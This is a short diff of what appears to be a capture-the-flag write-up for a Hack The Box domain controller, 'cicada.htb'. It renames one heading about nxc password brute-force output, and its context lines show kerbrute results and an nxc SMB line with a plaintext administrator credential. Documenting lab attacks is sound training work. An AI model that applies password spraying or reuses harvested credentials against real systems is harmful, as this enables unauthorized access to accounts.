@@ -458,7 +458,7 @@ Version: v1.0.3 (9dad6e1) - 12/05/24 - Ronnie Flathers @ropnop
 2024/12/05 22:52:51 >  Done! Tested 14 logins (0 successes) in 0.251 seconds
 ```
 
-nxc password bruteforce output (found user michael.wrightson):
+nxc user enumeration password bruteforce output (found user michael.wrightson):
 ```bash
 SMB         10.129.202.143  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
 SMB         10.129.202.143  445    CICADA-DC        [+] cicada.htb\administrator@cicada.htb:Cicada$M6Corpb*@Lp#nZp!8 (Guest)
